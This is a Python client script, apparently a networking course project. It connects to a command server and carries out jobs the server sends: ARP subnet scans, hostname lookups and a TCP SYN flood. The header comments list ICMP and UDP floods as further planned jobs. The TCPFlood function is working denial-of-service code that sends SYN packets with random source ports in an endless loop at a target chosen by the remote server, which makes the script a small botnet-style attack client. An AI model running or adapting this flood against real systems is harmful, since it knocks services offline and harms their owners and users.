# INSTRUCTIONS:
# 1) Change the SERVER const to match your machine's server
# 2) Change jobs instructions to match IPs and Machines that are online on your network
# 3) run server.py first
# 4) run client.py with administrator priviledges

# JOBS:
# ONE TO ONE
# 1) given IP address/Hostname    IS ONLINE/ ARE THEY CONNECTED TO THE NETWORK? NOTE: name of function is checkOneIP
# 3) detect all live IP addresses on a given subet. NOTE: name of function is checkAllIPs

# ONE-TO-MANY
# 1) execute an ICMP flood attack against a given IP or subnet
# 2) execute a TCP flood attack against an IP or port
# 3) UDP flood attack on IP/Port

import socket  # socket object will be used to make the connection
#from scapy.all import ARP, Ether, srp
from scapy.all import *


# CONSTANTS
HEADER = 1024  # wILL BE THE HEADER LENGTH
PORT = 5050  # Port that the socket will be using
FORMAT = 'utf-8'  # To encode messages that are sent
DISCONNECT_MESSAGE = '!disconnect'  # disconnect protocol msg
# NOTE: THIS IS LOCAL IP ADDRESS ON LAN, PLEASE ADJUST IT TO THE SERVER IP ADDRESS BY RUNNING ifconfig on linux or ipconfig /all on Windows
SERVER = '192.168.1.134'
ADDR = (SERVER, PORT)  # ADDRESS WILL BE TUPLE OF IP ADDRESS OF SERVER AND PORT#
# CREATE NEW VARIABLE CALLED CLIENT AND MAKE IT AN OBJECT OF THIS CONNECTION
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)  # CLIENT CONNECTS TO ABOVE IP ADDRESS
# '[HELLO]' protocol establishes the connection with server
GREETING_MSG = '[HELLO] Hello World!'


def sendMsgToServer(msg):  # sends msg to server
    message = msg.encode(FORMAT)  # encodes msg with utf-8
    msg_length = len(message)
    # SEND_length for header is equal to encoded message length
    send_length = str(msg_length).encode(FORMAT)

    # padd the message up to 124 bits adding b' ' byte of space
    send_length += b' ' * (HEADER - len(send_length))
    client.send(send_length)  # send info to server with padded header message
    client.send(message)  # send encoded message to server


def sendClnts(client_lst):  # takes string list of clients and sends them to the server
    sendMsgToServer(
        "The Following Devices are currently connected to the network: ")
    for clnt in client_lst:
        sendMsgToServer(clnt)


# will take a job order from the server and execute the order.
def jobHandler(string):
    jobRes = "Job Error"
    # the first portion of the string specifies which job to execute, this is standard in the protcol
    PROTOCOL_MSG = string[0:6]
    if PROTOCOL_MSG == '[IP#1]':
        # 49:65 is the location of the IP address of protocol IP#1
        target_ip = parseIP1(string)
        jobRes = checkAllIPs(target_ip)
        return jobRes
    elif PROTOCOL_MSG == '[IP#2]':
        # 10:26 is the location of the IP address of protocol IP#2
        target_ip = parseIP2_3(string)
        hostname = 'none'
        jobRes = checkOneIP(target_ip, hostname)
        return jobRes
    elif PROTOCOL_MSG == '[IP#3]':
        target_ip = 'none'
        hostname = parseIP2_3(string)
        jobRes = checkOneIP(target_ip, hostname)
        return jobRes
    elif PROTOCOL_MSG == '[TCPF]':
        target_ip = parseFloodIP(string)
        port_num = int(parseFloodPort(string))
        jobRes = TCPFlood(target_ip, port_num)
        return jobRes


# takes an ip, finds out all the connections in its subnet.
def checkAllIPs(target_ip):
    arp = ARP(pdst=target_ip)  # create ARP packet
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")  # create ether broadcast packet
    packet = ether/arp  # stacks ether and arp packets
    # sends the packet and receives them at the data link layer, times out in 3 secs
    result = srp(packet, timeout=3)[0]
    # result contains sent and received packet in pairs
    clients = []
    for sent, received in result:
        # will append ip and MAC address to 'clients' list for every response received.
        clients.append({'ip': received.psrc, 'mac': received.hwsrc})

    clnt_lst = []
    for clnt in clients:
        # take only the ip component and append it to a list of type string.
        clnt_lst.append(str("{}".format(clnt['ip'])))

    return clnt_lst  # returns a string list of clients that are connected to the subnet


def checkOneIP(target_ip, hostname):  # takes ip OR hostname
    IPCONNMSG = f"{target_ip} is connected to the network!"
    IPNOTCONNMSG = f"{target_ip} is NOT connected to the network!"
    HSTCONNMSG = f"{hostname} is connected to the network!"
    HSTNOTCONNMSG = f"{hostname} is NOT connected to the network!"

    if(hostname == 'none'):  # we only have target_ip
        online_lst = checkAllIPs(target_ip)  # check subnet
        print(target_ip)
        print(online_lst)
        if(target_ip in online_lst):  # if given ip is in subnet
            return IPCONNMSG
        else:
            return IPNOTCONNMSG
    else:  # we only have hostname
        if(target_ip == 'none'):  # if there's no IP given, use your subnet's IP address
            wanted_IP = SERVER + '/24'  # use this as the default IP
        else:
            wanted_IP = target_ip

        # returns list of connected IPs to the subnet
        online_lst = checkAllIPs(wanted_IP)

        # returns list of machine names that are connected to the subnet
        online_machnLst = findHostNames(online_lst)

        if(hostname in online_machnLst):
            return HSTCONNMSG
        else:
            return HSTNOTCONNMSG


def parseIP1(string):
    start = string.find('of ') + len('of ')
    end = string.find(' please')
    substring = string[start:end]
    print(substring)
    return substring


# to handle [IP#3] protocol and extract a variable hostname
def parseIP2_3(string):
    start = string.find('is ') + len('is ')
    end = string.find(' Online?')
    substring = string[start:end]
    return substring


def parseFloodIP(string):
    start = string.find('Flood ') + len('Flood ')
    end = string.find(' at')
    substring = string[start:end]
    return substring


def parseFloodPort(string):
    start = string.find('number ') + len('number ')
    end = len(string)
    substring = string[start:end]
    return substring

# given a list of IPs, it finds the associated hostnames and returns a list


def findHostNames(ip_lst):
    nameLst = []
    for IP in ip_lst:
        try:
            # since a tupule is returned, we only want the hostname which is the first value in the tupule
            hst_name = socket.gethostbyaddr(IP)[0]
            nameLst.append(hst_name)
        except socket.herror:
            print(f"{IP} does not have a PTR record")
    print(nameLst)
    return nameLst


def TCPFlood(target_ip, port_num):
    ip = IP(dst=target_ip)
    # creates TCP packet with random source port, flag S means we're sending SYN (first part of handshake) msg for TCP
    tcp = TCP(sport=RandShort(), dport=port_num, flags="S")
    payload = Raw(b"TCPFLOOD"*128)  # 1KB of data will be sent
    p = ip / tcp / payload  # will stack up the layers
    # sends constructed packet until Ctrl+C is pressed
    print(
        f"Now Flooding {target_ip} at Port {port_num} please press Ctrl+C in 5 seconds")
    send(p, loop=1, verbose=0)
    return f"Successfully Flooded IP Address {target_ip} At Port Number {port_num}"


# def UDPFlood(target_ip, port_num):


sendMsgToServer(GREETING_MSG)  # first message to send
input()
rcvd_msg = client.recv(2048).decode(FORMAT)
print(rcvd_msg)  # print receive message from server

jobResult = jobHandler(rcvd_msg)

if isinstance(jobResult, list):  # if the result is a list it means list of IPs is returned
    for ipAddr in jobResult:
        sendMsgToServer(ipAddr)
else:
    sendMsgToServer(jobResult)


input()


input()
sendMsgToServer("Disconnecting now!")  # disconnect message
sendMsgToServer(DISCONNECT_MESSAGE)  # send disconnect message
